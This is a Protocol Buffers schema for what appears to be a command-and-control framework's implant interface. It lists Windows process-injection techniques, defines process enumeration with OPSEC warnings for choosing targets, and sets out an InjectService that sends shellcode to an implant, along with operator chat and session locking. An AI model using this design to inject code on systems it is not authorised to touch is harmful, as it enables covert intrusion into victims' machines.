// =============================================================================
// Process Injection (Phase 7)
// =============================================================================

enum InjectionMethod {
  INJECTION_METHOD_UNSPECIFIED = 0;
  INJECTION_METHOD_AUTO = 1;           // Framework selects best method
  INJECTION_METHOD_WIN32 = 2;          // VirtualAllocEx + CreateRemoteThread
  INJECTION_METHOD_NT_API = 3;         // NtAllocateVirtualMemory + NtCreateThreadEx
  INJECTION_METHOD_APC = 4;            // NtQueueApcThread (requires alertable thread)
  INJECTION_METHOD_THREAD_HIJACK = 5;  // Suspend + SetThreadContext
  INJECTION_METHOD_EARLY_BIRD = 6;     // Create suspended process + APC before resume
  INJECTION_METHOD_MODULE_STOMPING = 7; // Overwrite legitimate DLL .text section
}

enum ProcessIntegrity {
  PROCESS_INTEGRITY_UNKNOWN = 0;
  PROCESS_INTEGRITY_UNTRUSTED = 1;
  PROCESS_INTEGRITY_LOW = 2;
  PROCESS_INTEGRITY_MEDIUM = 3;
  PROCESS_INTEGRITY_HIGH = 4;
  PROCESS_INTEGRITY_SYSTEM = 5;
  PROCESS_INTEGRITY_PROTECTED = 6;  // PPL
}

message ProcessEntry {
  uint32 pid = 1;
  uint32 ppid = 2;
  string name = 3;
  string path = 4;
  string user = 5;
  string arch = 6;  // "x64", "x86", "arm64"
  ProcessIntegrity integrity = 7;
  bool is_elevated = 8;
  bool is_current = 9;      // Is this the implant's process?
  bool is_injectable = 10;  // Arch matches and not protected
  string warning = 11;      // OPSEC warning if any
}

message ListProcessesRequest {
  Uuid implant_id = 1;
  bool include_system = 2;
  string name_filter = 3;
}

message ListProcessesResponse {
  repeated ProcessEntry processes = 1;
  string implant_arch = 2;
}

message InjectRequest {
  Uuid implant_id = 1;
  uint32 target_pid = 2;
  bytes shellcode = 3;
  InjectionMethod method = 4;
  bool wait_for_completion = 5;
  uint32 timeout_ms = 6;
}

message InjectResponse {
  bool success = 1;
  uint32 thread_id = 2;
  string error = 3;
  string technique_used = 4;
}

service CollabService {
  // Stream real-time collaboration events
  rpc StreamEvents(StreamCollabEventsRequest) returns (stream CollabEvent);

  // Operator presence
  rpc GetOnlineOperators(GetOnlineOperatorsRequest) returns (GetOnlineOperatorsResponse);
  rpc SetActiveSession(SetActiveSessionRequest) returns (OperatorPresence);

  // Session locking
  rpc LockSession(LockSessionRequest) returns (SessionLock);
  rpc UnlockSession(UnlockSessionRequest) returns (SessionLock);
  rpc GetSessionLocks(GetSessionLocksRequest) returns (GetSessionLocksResponse);

  // Chat
  rpc SendChat(SendChatRequest) returns (ChatMessageEvent);
  rpc GetChatHistory(GetChatHistoryRequest) returns (GetChatHistoryResponse);

  // Stats
  rpc GetStats(GetCollabStatsRequest) returns (CollabStatsResponse);
}

service InjectService {
  // List processes on target for injection targeting
  rpc ListProcesses(ListProcessesRequest) returns (ListProcessesResponse);

  // Inject shellcode into target process
  rpc Inject(InjectRequest) returns (InjectResponse);
}

